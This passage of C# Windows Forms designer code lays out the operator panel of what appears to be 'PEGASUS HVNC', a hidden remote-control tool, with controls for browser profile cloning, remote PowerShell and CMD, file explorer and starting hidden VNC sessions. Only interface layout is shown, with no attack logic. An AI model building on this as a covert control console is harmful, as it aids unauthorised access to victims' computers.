			RestoreMaxBtn.Location = new System.Drawing.Point(55, 730);
			RestoreMaxBtn.Name = "RestoreMaxBtn";
			RestoreMaxBtn.PressedState.ImageSize = new System.Drawing.Size(31, 31);
			RestoreMaxBtn.PressedState.Parent = RestoreMaxBtn;
			RestoreMaxBtn.ShadowDecoration.Parent = RestoreMaxBtn;
			RestoreMaxBtn.Size = new System.Drawing.Size(36, 32);
			RestoreMaxBtn.TabIndex = 42;
			guna2HtmlToolTip1.SetToolTip(RestoreMaxBtn, "Maximize Selected Window!");
			RestoreMaxBtn.UseTransparentBackground = true;
			RestoreMaxBtn.Click += new System.EventHandler(RestoreMaxBtn_Click);
			IntervalLabel.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			IntervalLabel.AutoSize = true;
			IntervalLabel.ForeColor = System.Drawing.Color.Gainsboro;
			IntervalLabel.Location = new System.Drawing.Point(26, 765);
			IntervalLabel.Name = "IntervalLabel";
			IntervalLabel.Size = new System.Drawing.Size(97, 14);
			IntervalLabel.TabIndex = 6;
			IntervalLabel.Text = "Interval (ms): 500";
			MinBtn.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			MinBtn.CheckedState.ImageSize = new System.Drawing.Size(64, 64);
			MinBtn.CheckedState.Parent = MinBtn;
			MinBtn.HoverState.ImageSize = new System.Drawing.Size(31, 31);
			MinBtn.HoverState.Parent = MinBtn;
			MinBtn.Image = PEGASUS_LIME.Properties.Resources.grammes;
			MinBtn.ImageOffset = new System.Drawing.Point(0, 0);
			MinBtn.ImageRotate = 0f;
			MinBtn.ImageSize = new System.Drawing.Size(30, 30);
			MinBtn.Location = new System.Drawing.Point(19, 730);
			MinBtn.Name = "MinBtn";
			MinBtn.PressedState.ImageSize = new System.Drawing.Size(31, 31);
			MinBtn.PressedState.Parent = MinBtn;
			MinBtn.ShadowDecoration.Parent = MinBtn;
			MinBtn.Size = new System.Drawing.Size(36, 32);
			MinBtn.TabIndex = 43;
			guna2HtmlToolTip1.SetToolTip(MinBtn, "Minimize Selected Window!");
			MinBtn.Click += new System.EventHandler(MinBtn_Click);
			IntervalScroll.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			IntervalScroll.HoverState.Parent = IntervalScroll;
			IntervalScroll.Location = new System.Drawing.Point(29, 782);
			IntervalScroll.Maximum = 1000;
			IntervalScroll.Name = "IntervalScroll";
			IntervalScroll.Size = new System.Drawing.Size(94, 28);
			IntervalScroll.TabIndex = 8;
			IntervalScroll.ThumbColor = System.Drawing.Color.FromArgb(9, 248, 121);
			IntervalScroll.Value = 500;
			IntervalScroll.Scroll += new System.Windows.Forms.ScrollEventHandler(IntervalScroll_Scroll);
			guna2Button3.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			guna2Button3.Animated = true;
			guna2Button3.BackColor = System.Drawing.Color.Transparent;
			guna2Button3.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			guna2Button3.BorderThickness = 1;
			guna2Button3.CheckedState.BorderColor = System.Drawing.Color.White;
			guna2Button3.CheckedState.FillColor = System.Drawing.Color.Black;
			guna2Button3.CheckedState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			guna2Button3.CheckedState.Parent = guna2Button3;
			guna2Button3.CustomImages.Parent = guna2Button3;
			guna2Button3.DisabledState.BorderColor = System.Drawing.Color.White;
			guna2Button3.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			guna2Button3.DisabledState.FillColor = System.Drawing.Color.Black;
			guna2Button3.DisabledState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			guna2Button3.DisabledState.Parent = guna2Button3;
			guna2Button3.FillColor = System.Drawing.Color.Transparent;
			guna2Button3.Font = new System.Drawing.Font("Electrolize", 9f);
			guna2Button3.ForeColor = System.Drawing.Color.White;
			guna2Button3.HoverState.BorderColor = System.Drawing.Color.White;
			guna2Button3.HoverState.FillColor = System.Drawing.Color.Black;
			guna2Button3.HoverState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			guna2Button3.HoverState.Parent = guna2Button3;
			guna2Button3.ImageSize = new System.Drawing.Size(30, 30);
			guna2Button3.Location = new System.Drawing.Point(23, 430);
			guna2Button3.Name = "guna2Button3";
			guna2Button3.ShadowDecoration.Parent = guna2Button3;
			guna2Button3.Size = new System.Drawing.Size(94, 25);
			guna2Button3.TabIndex = 45;
			guna2Button3.Text = "System Control";
			guna2HtmlToolTip1.SetToolTip(guna2Button3, "System Menu!");
			guna2Button3.Click += new System.EventHandler(guna2Button3_Click_2);
			QualityScroll.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			QualityScroll.FillColor = System.Drawing.Color.White;
			QualityScroll.HoverState.Parent = QualityScroll;
			QualityScroll.Location = new System.Drawing.Point(29, 532);
			QualityScroll.Name = "QualityScroll";
			QualityScroll.Size = new System.Drawing.Size(83, 14);
			QualityScroll.Style = Guna.UI2.WinForms.Enums.TrackBarStyle.Metro;
			QualityScroll.TabIndex = 151;
			QualityScroll.ThumbColor = System.Drawing.Color.FromArgb(9, 248, 121);
			QualityScroll.Value = 99;
			QualityScroll.Scroll += new System.Windows.Forms.ScrollEventHandler(QualityScroll_Scroll);
			QualityLabel.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			QualityLabel.AutoSize = true;
			QualityLabel.ForeColor = System.Drawing.Color.Gainsboro;
			QualityLabel.Location = new System.Drawing.Point(26, 514);
			QualityLabel.Name = "QualityLabel";
			QualityLabel.Size = new System.Drawing.Size(54, 14);
			QualityLabel.TabIndex = 150;
			QualityLabel.Text = "HQ: 99%";
			guna2HtmlToolTip1.SetToolTip(QualityLabel, "Quality scrol!");
			guna2Button2.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			guna2Button2.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			guna2Button2.BorderThickness = 1;
			guna2Button2.CheckedState.BorderColor = System.Drawing.Color.White;
			guna2Button2.CheckedState.FillColor = System.Drawing.Color.Black;
			guna2Button2.CheckedState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			guna2Button2.CheckedState.Parent = guna2Button2;
			guna2Button2.CustomImages.Parent = guna2Button2;
			guna2Button2.DisabledState.BorderColor = System.Drawing.Color.White;
			guna2Button2.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			guna2Button2.DisabledState.FillColor = System.Drawing.Color.Black;
			guna2Button2.DisabledState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			guna2Button2.DisabledState.Parent = guna2Button2;
			guna2Button2.FillColor = System.Drawing.Color.Black;
			guna2Button2.Font = new System.Drawing.Font("Electrolize", 9f);
			guna2Button2.ForeColor = System.Drawing.Color.White;
			guna2Button2.HoverState.BorderColor = System.Drawing.Color.White;
			guna2Button2.HoverState.FillColor = System.Drawing.Color.Black;
			guna2Button2.HoverState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			guna2Button2.HoverState.Parent = guna2Button2;
			guna2Button2.ImageSize = new System.Drawing.Size(30, 30);
			guna2Button2.Location = new System.Drawing.Point(23, 374);
			guna2Button2.Name = "guna2Button2";
			guna2Button2.ShadowDecoration.Parent = guna2Button2;
			guna2Button2.Size = new System.Drawing.Size(94, 25);
			guna2Button2.TabIndex = 39;
			guna2Button2.Text = "Disconnect";
			guna2HtmlToolTip1.SetToolTip(guna2Button2, "Disconnect Menu!");
			guna2Button2.Click += new System.EventHandler(guna2Button2_Click);
			ResizeScroll.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			ResizeScroll.BackColor = System.Drawing.Color.Transparent;
			ResizeScroll.FillColor = System.Drawing.Color.White;
			ResizeScroll.HoverState.Parent = ResizeScroll;
			ResizeScroll.Location = new System.Drawing.Point(29, 566);
			ResizeScroll.Name = "ResizeScroll";
			ResizeScroll.Size = new System.Drawing.Size(83, 14);
			ResizeScroll.Style = Guna.UI2.WinForms.Enums.TrackBarStyle.Metro;
			ResizeScroll.TabIndex = 8;
			ResizeScroll.ThumbColor = System.Drawing.Color.FromArgb(9, 248, 121);
			ResizeScroll.Value = 75;
			ResizeScroll.Scroll += new System.Windows.Forms.ScrollEventHandler(ResizeScroll_Scroll);
			label1.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			label1.AutoSize = true;
			label1.ForeColor = System.Drawing.Color.Gainsboro;
			label1.Location = new System.Drawing.Point(41, 346);
			label1.Name = "label1";
			label1.Size = new System.Drawing.Size(71, 14);
			label1.TabIndex = 4;
			label1.Text = "Clone Profile";
			chkClone1.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			chkClone1.AutoSize = true;
			chkClone1.ForeColor = System.Drawing.Color.Gainsboro;
			chkClone1.Location = new System.Drawing.Point(24, 548);
			chkClone1.Name = "chkClone1";
			chkClone1.Size = new System.Drawing.Size(59, 14);
			chkClone1.TabIndex = 4;
			chkClone1.Text = "Size : 75%";
			guna2HtmlToolTip1.SetToolTip(chkClone1, "Resize scrol!");
			guna2Button1.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			guna2Button1.Animated = true;
			guna2Button1.BackColor = System.Drawing.Color.Transparent;
			guna2Button1.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			guna2Button1.BorderThickness = 1;
			guna2Button1.CheckedState.BorderColor = System.Drawing.Color.White;
			guna2Button1.CheckedState.FillColor = System.Drawing.Color.Black;
			guna2Button1.CheckedState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			guna2Button1.CheckedState.Parent = guna2Button1;
			guna2Button1.CustomImages.Parent = guna2Button1;
			guna2Button1.DisabledState.BorderColor = System.Drawing.Color.White;
			guna2Button1.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			guna2Button1.DisabledState.FillColor = System.Drawing.Color.Black;
			guna2Button1.DisabledState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			guna2Button1.DisabledState.Parent = guna2Button1;
			guna2Button1.FillColor = System.Drawing.Color.Transparent;
			guna2Button1.Font = new System.Drawing.Font("Electrolize", 9f);
			guna2Button1.ForeColor = System.Drawing.Color.White;
			guna2Button1.HoverState.BorderColor = System.Drawing.Color.White;
			guna2Button1.HoverState.FillColor = System.Drawing.Color.Black;
			guna2Button1.HoverState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			guna2Button1.HoverState.Parent = guna2Button1;
			guna2Button1.ImageSize = new System.Drawing.Size(30, 30);
			guna2Button1.Location = new System.Drawing.Point(23, 457);
			guna2Button1.Name = "guna2Button1";
			guna2Button1.ShadowDecoration.Color = System.Drawing.Color.FromArgb(191, 38, 33);
			guna2Button1.ShadowDecoration.Parent = guna2Button1;
			guna2Button1.Size = new System.Drawing.Size(94, 25);
			guna2Button1.TabIndex = 148;
			guna2Button1.Text = "Browsers";
			guna2HtmlToolTip1.SetToolTip(guna2Button1, "Browsers Menu!");
			guna2Button1.Click += new System.EventHandler(guna2Button1_Click_1);
			chkClone.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			chkClone.CheckedState.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			chkClone.CheckedState.BorderRadius = 0;
			chkClone.CheckedState.BorderThickness = 1;
			chkClone.CheckedState.FillColor = System.Drawing.Color.FromArgb(9, 248, 121);
			chkClone.CheckedState.Parent = chkClone;
			chkClone.CheckMarkColor = System.Drawing.Color.Black;
			chkClone.ForeColor = System.Drawing.Color.Gainsboro;
			chkClone.Location = new System.Drawing.Point(23, 343);
			chkClone.Name = "chkClone";
			chkClone.ShadowDecoration.Parent = chkClone;
			chkClone.Size = new System.Drawing.Size(16, 19);
			chkClone.TabIndex = 4;
			chkClone.Text = "guna2CustomCheckBox1";
			guna2HtmlToolTip1.SetToolTip(chkClone, "Clone Profile!");
			chkClone.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			chkClone.UncheckedState.BorderRadius = 0;
			chkClone.UncheckedState.BorderThickness = 1;
			chkClone.UncheckedState.FillColor = System.Drawing.Color.Black;
			chkClone.UncheckedState.Parent = chkClone;
			guna2Button4.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			guna2Button4.Animated = true;
			guna2Button4.BackColor = System.Drawing.Color.Transparent;
			guna2Button4.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			guna2Button4.BorderThickness = 1;
			guna2Button4.CheckedState.BorderColor = System.Drawing.Color.White;
			guna2Button4.CheckedState.FillColor = System.Drawing.Color.Black;
			guna2Button4.CheckedState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			guna2Button4.CheckedState.Parent = guna2Button4;
			guna2Button4.CustomImages.Parent = guna2Button4;
			guna2Button4.DisabledState.BorderColor = System.Drawing.Color.White;
			guna2Button4.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
			guna2Button4.DisabledState.FillColor = System.Drawing.Color.Black;
			guna2Button4.DisabledState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			guna2Button4.DisabledState.Parent = guna2Button4;
			guna2Button4.FillColor = System.Drawing.Color.Transparent;
			guna2Button4.Font = new System.Drawing.Font("Electrolize", 9f);
			guna2Button4.ForeColor = System.Drawing.Color.White;
			guna2Button4.HoverState.BorderColor = System.Drawing.Color.White;
			guna2Button4.HoverState.FillColor = System.Drawing.Color.Black;
			guna2Button4.HoverState.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			guna2Button4.HoverState.Parent = guna2Button4;
			guna2Button4.ImageSize = new System.Drawing.Size(30, 30);
			guna2Button4.Location = new System.Drawing.Point(23, 402);
			guna2Button4.Margin = new System.Windows.Forms.Padding(0);
			guna2Button4.Name = "guna2Button4";
			guna2Button4.ShadowDecoration.Parent = guna2Button4;
			guna2Button4.Size = new System.Drawing.Size(94, 25);
			guna2Button4.TabIndex = 149;
			guna2Button4.Text = "Applications";
			guna2HtmlToolTip1.SetToolTip(guna2Button4, "Apps Menu!");
			guna2Button4.Click += new System.EventHandler(guna2Button4_Click_1);
			pictureBox1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			pictureBox1.Image = PEGASUS_LIME.Properties.Resources.pegamatrix;
			pictureBox1.Location = new System.Drawing.Point(0, 113);
			pictureBox1.Name = "pictureBox1";
			pictureBox1.Size = new System.Drawing.Size(140, 67);
			pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
			pictureBox1.TabIndex = 145;
			pictureBox1.TabStop = false;
			guna2ControlBox3.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			guna2ControlBox3.BackColor = System.Drawing.Color.Transparent;
			guna2ControlBox3.BackgroundImage = (System.Drawing.Image)resources.GetObject("guna2ControlBox3.BackgroundImage");
			guna2ControlBox3.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
			guna2ControlBox3.ControlBoxType = Guna.UI2.WinForms.Enums.ControlBoxType.MinimizeBox;
			guna2ControlBox3.FillColor = System.Drawing.Color.Transparent;
			guna2ControlBox3.HoverState.BorderColor = System.Drawing.Color.Black;
			guna2ControlBox3.HoverState.FillColor = System.Drawing.Color.Black;
			guna2ControlBox3.HoverState.IconColor = System.Drawing.Color.FromArgb(9, 248, 121);
			guna2ControlBox3.HoverState.Parent = guna2ControlBox3;
			guna2ControlBox3.IconColor = System.Drawing.Color.White;
			guna2ControlBox3.Location = new System.Drawing.Point(0, 16);
			guna2ControlBox3.Name = "guna2ControlBox3";
			guna2ControlBox3.ShadowDecoration.Parent = guna2ControlBox3;
			guna2ControlBox3.ShowIcon = false;
			guna2ControlBox3.Size = new System.Drawing.Size(45, 31);
			guna2ControlBox3.TabIndex = 0;
			guna2ControlBox3.UseTransparentBackground = true;
			guna2ControlBox2.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			guna2ControlBox2.BackColor = System.Drawing.Color.Transparent;
			guna2ControlBox2.BackgroundImage = (System.Drawing.Image)resources.GetObject("guna2ControlBox2.BackgroundImage");
			guna2ControlBox2.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
			guna2ControlBox2.ControlBoxType = Guna.UI2.WinForms.Enums.ControlBoxType.MaximizeBox;
			guna2ControlBox2.FillColor = System.Drawing.Color.Transparent;
			guna2ControlBox2.HoverState.BorderColor = System.Drawing.Color.Black;
			guna2ControlBox2.HoverState.FillColor = System.Drawing.Color.Black;
			guna2ControlBox2.HoverState.IconColor = System.Drawing.Color.FromArgb(9, 248, 121);
			guna2ControlBox2.HoverState.Parent = guna2ControlBox2;
			guna2ControlBox2.IconColor = System.Drawing.Color.White;
			guna2ControlBox2.Location = new System.Drawing.Point(49, 16);
			guna2ControlBox2.Name = "guna2ControlBox2";
			guna2ControlBox2.ShadowDecoration.Parent = guna2ControlBox2;
			guna2ControlBox2.ShowIcon = false;
			guna2ControlBox2.Size = new System.Drawing.Size(45, 31);
			guna2ControlBox2.TabIndex = 0;
			guna2ControlBox2.UseTransparentBackground = true;
			guna2ControlBox1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			guna2ControlBox1.BackColor = System.Drawing.Color.Transparent;
			guna2ControlBox1.BackgroundImage = (System.Drawing.Image)resources.GetObject("guna2ControlBox1.BackgroundImage");
			guna2ControlBox1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
			guna2ControlBox1.FillColor = System.Drawing.Color.Transparent;
			guna2ControlBox1.HoverState.BorderColor = System.Drawing.Color.Black;
			guna2ControlBox1.HoverState.FillColor = System.Drawing.Color.Black;
			guna2ControlBox1.HoverState.IconColor = System.Drawing.Color.FromArgb(9, 248, 121);
			guna2ControlBox1.HoverState.Parent = guna2ControlBox1;
			guna2ControlBox1.IconColor = System.Drawing.Color.White;
			guna2ControlBox1.Location = new System.Drawing.Point(98, 16);
			guna2ControlBox1.Name = "guna2ControlBox1";
			guna2ControlBox1.ShadowDecoration.Parent = guna2ControlBox1;
			guna2ControlBox1.ShowIcon = false;
			guna2ControlBox1.Size = new System.Drawing.Size(45, 31);
			guna2ControlBox1.TabIndex = 0;
			guna2ControlBox1.UseTransparentBackground = true;
			statusStrip1.BackColor = System.Drawing.Color.Black;
			statusStrip1.Dock = System.Windows.Forms.DockStyle.Right;
			statusStrip1.Font = new System.Drawing.Font("Electrolize", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			statusStrip1.GripStyle = System.Windows.Forms.ToolStripGripStyle.Visible;
			statusStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[2] { toolStripStatusLabel3, PingStatusLabel });
			statusStrip1.Location = new System.Drawing.Point(1008, 0);
			statusStrip1.Name = "statusStrip1";
			statusStrip1.Size = new System.Drawing.Size(47, 38);
			statusStrip1.SizingGrip = false;
			statusStrip1.TabIndex = 19;
			toolStripStatusLabel3.ForeColor = System.Drawing.Color.Gainsboro;
			toolStripStatusLabel3.Name = "toolStripStatusLabel3";
			toolStripStatusLabel3.Size = new System.Drawing.Size(45, 15);
			toolStripStatusLabel3.Text = "Status";
			PingStatusLabel.ForeColor = System.Drawing.Color.Gainsboro;
			PingStatusLabel.Name = "PingStatusLabel";
			PingStatusLabel.Size = new System.Drawing.Size(62, 15);
			PingStatusLabel.Text = "Ping: 0ms";
			PingStatusLabel.Visible = false;
			ClientRecoveryLabel.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			ClientRecoveryLabel.AutoSize = true;
			ClientRecoveryLabel.Font = new System.Drawing.Font("Electrolize", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			ClientRecoveryLabel.ForeColor = System.Drawing.Color.White;
			ClientRecoveryLabel.Location = new System.Drawing.Point(13, 9);
			ClientRecoveryLabel.Name = "ClientRecoveryLabel";
			ClientRecoveryLabel.Size = new System.Drawing.Size(92, 14);
			ClientRecoveryLabel.TabIndex = 1;
			ClientRecoveryLabel.Text = "PEGASUS HVNC";
			guna2HtmlToolTip1.SetToolTip(ClientRecoveryLabel, "Connected pc Username and Ip!");
			timer2.Enabled = true;
			timer2.Interval = 1000;
			timer2.Tick += new System.EventHandler(timer2_Tick);
			toolStripStatusLabel2.Name = "toolStripStatusLabel2";
			toolStripStatusLabel2.Size = new System.Drawing.Size(26, 17);
			toolStripStatusLabel2.Text = "Idle";
			toolStripStatusLabel1.Name = "toolStripStatusLabel1";
			toolStripStatusLabel1.Size = new System.Drawing.Size(44, 17);
			toolStripStatusLabel1.Text = "Statut :";
			timer1.Tick += new System.EventHandler(timer1_Tick);
			panel4.BackColor = System.Drawing.Color.Black;
			panel4.Controls.Add(bunifuSeparator3);
			panel4.Controls.Add(ClientRecoveryLabel);
			panel4.Controls.Add(bunifuSeparator4);
			panel4.Controls.Add(statusStrip1);
			panel4.Dock = System.Windows.Forms.DockStyle.Bottom;
			panel4.Location = new System.Drawing.Point(0, 807);
			panel4.Name = "panel4";
			panel4.Size = new System.Drawing.Size(1055, 38);
			panel4.TabIndex = 39;
			panel4.MouseDown += new System.Windows.Forms.MouseEventHandler(panel4_MouseDown);
			bunifuSeparator3.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			bunifuSeparator3.BackColor = System.Drawing.Color.Transparent;
			bunifuSeparator3.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuSeparator3.BackgroundImage");
			bunifuSeparator3.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			bunifuSeparator3.Location = new System.Drawing.Point(0, -5);
			bunifuSeparator3.Margin = new System.Windows.Forms.Padding(2);
			bunifuSeparator3.Name = "bunifuSeparator3";
			bunifuSeparator3.Size = new System.Drawing.Size(1055, 10);
			bunifuSeparator3.TabIndex = 261;
			bunifuSeparator4.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			bunifuSeparator4.BackColor = System.Drawing.Color.Transparent;
			bunifuSeparator4.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuSeparator4.BackgroundImage");
			bunifuSeparator4.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			bunifuSeparator4.Location = new System.Drawing.Point(9, 24);
			bunifuSeparator4.Margin = new System.Windows.Forms.Padding(2);
			bunifuSeparator4.Name = "bunifuSeparator4";
			bunifuSeparator4.Size = new System.Drawing.Size(223, 10);
			bunifuSeparator4.TabIndex = 261;
			toolStripSeparator1.Name = "toolStripSeparator1";
			toolStripSeparator1.Size = new System.Drawing.Size(244, 6);
			panel3.BackColor = System.Drawing.Color.Black;
			panel3.Dock = System.Windows.Forms.DockStyle.Top;
			panel3.Location = new System.Drawing.Point(0, 0);
			panel3.Name = "panel3";
			panel3.Size = new System.Drawing.Size(1055, 44);
			panel3.TabIndex = 36;
			panel3.Visible = false;
			guna2ContextMenuStrip2.BackColor = System.Drawing.Color.Black;
			guna2ContextMenuStrip2.ImageScalingSize = new System.Drawing.Size(25, 25);
			guna2ContextMenuStrip2.Items.AddRange(new System.Windows.Forms.ToolStripItem[8] { fileExplorerToolStripMenuItem, powershellToolStripMenuItem, cMDToolStripMenuItem, windowsToolStripMenuItem, copyToolStripMenuItem, toolStripMenuItem2, StarthVNC, StophVNC });
			guna2ContextMenuStrip2.Name = "guna2ContextMenuStrip2";
			guna2ContextMenuStrip2.RenderStyle.ArrowColor = System.Drawing.Color.Black;
			guna2ContextMenuStrip2.RenderStyle.BorderColor = System.Drawing.Color.Black;
			guna2ContextMenuStrip2.RenderStyle.ColorTable = null;
			guna2ContextMenuStrip2.RenderStyle.RoundedEdges = true;
			guna2ContextMenuStrip2.RenderStyle.SelectionArrowColor = System.Drawing.Color.White;
			guna2ContextMenuStrip2.RenderStyle.SelectionBackColor = System.Drawing.Color.Black;
			guna2ContextMenuStrip2.RenderStyle.SelectionForeColor = System.Drawing.Color.White;
			guna2ContextMenuStrip2.RenderStyle.SeparatorColor = System.Drawing.Color.Gainsboro;
			guna2ContextMenuStrip2.RenderStyle.TextRenderingHint = System.Drawing.Text.TextRenderingHint.SystemDefault;
			guna2ContextMenuStrip2.ShowImageMargin = false;
			guna2ContextMenuStrip2.Size = new System.Drawing.Size(220, 196);
			fileExplorerToolStripMenuItem.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
			fileExplorerToolStripMenuItem.Font = new System.Drawing.Font("Electrolize", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			fileExplorerToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			fileExplorerToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("fileExplorerToolStripMenuItem.Image");
			fileExplorerToolStripMenuItem.Name = "fileExplorerToolStripMenuItem";
			fileExplorerToolStripMenuItem.Size = new System.Drawing.Size(219, 24);
			fileExplorerToolStripMenuItem.Text = "  File Explorer                 ";
			fileExplorerToolStripMenuItem.Click += new System.EventHandler(fileExplorerToolStripMenuItem_Click);
			powershellToolStripMenuItem.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
			powershellToolStripMenuItem.Font = new System.Drawing.Font("Electrolize", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			powershellToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			powershellToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("powershellToolStripMenuItem.Image");
			powershellToolStripMenuItem.Name = "powershellToolStripMenuItem";
			powershellToolStripMenuItem.Size = new System.Drawing.Size(219, 24);
			powershellToolStripMenuItem.Text = "  Powershell";
			powershellToolStripMenuItem.Click += new System.EventHandler(powershellToolStripMenuItem_Click);
			cMDToolStripMenuItem.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
			cMDToolStripMenuItem.Font = new System.Drawing.Font("Electrolize", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			cMDToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			cMDToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("cMDToolStripMenuItem.Image");
			cMDToolStripMenuItem.Name = "cMDToolStripMenuItem";
			cMDToolStripMenuItem.Size = new System.Drawing.Size(219, 24);
			cMDToolStripMenuItem.Text = "  CMD";
			cMDToolStripMenuItem.Click += new System.EventHandler(cMDToolStripMenuItem_Click);
			windowsToolStripMenuItem.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
			windowsToolStripMenuItem.Font = new System.Drawing.Font("Electrolize", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			windowsToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			windowsToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("windowsToolStripMenuItem.Image");
			windowsToolStripMenuItem.Name = "windowsToolStripMenuItem";
			windowsToolStripMenuItem.Size = new System.Drawing.Size(219, 24);
			windowsToolStripMenuItem.Text = "  Windows";
			windowsToolStripMenuItem.Click += new System.EventHandler(windowsToolStripMenuItem_Click);
			copyToolStripMenuItem.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
			copyToolStripMenuItem.Font = new System.Drawing.Font("Electrolize", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			copyToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			copyToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("copyToolStripMenuItem.Image");
			copyToolStripMenuItem.Name = "copyToolStripMenuItem";
			copyToolStripMenuItem.Size = new System.Drawing.Size(219, 24);
			copyToolStripMenuItem.Text = "  Copy";
			copyToolStripMenuItem.Click += new System.EventHandler(copyToolStripMenuItem_Click);
			toolStripMenuItem2.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
			toolStripMenuItem2.Font = new System.Drawing.Font("Electrolize", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			toolStripMenuItem2.ForeColor = System.Drawing.Color.White;
			toolStripMenuItem2.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem2.Image");
			toolStripMenuItem2.Name = "toolStripMenuItem2";
			toolStripMenuItem2.Size = new System.Drawing.Size(219, 24);
			toolStripMenuItem2.Text = "  Paste";
			toolStripMenuItem2.Click += new System.EventHandler(pasteToolStripMenuItem_Click);
			StarthVNC.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
			StarthVNC.Font = new System.Drawing.Font("Electrolize", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			StarthVNC.ForeColor = System.Drawing.Color.White;
			StarthVNC.Image = (System.Drawing.Image)resources.GetObject("StarthVNC.Image");
			StarthVNC.Name = "StarthVNC";
			StarthVNC.Size = new System.Drawing.Size(219, 24);
			StarthVNC.Text = "  Start hVNC";
			StarthVNC.Click += new System.EventHandler(StarthVNC_Click);
			StophVNC.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
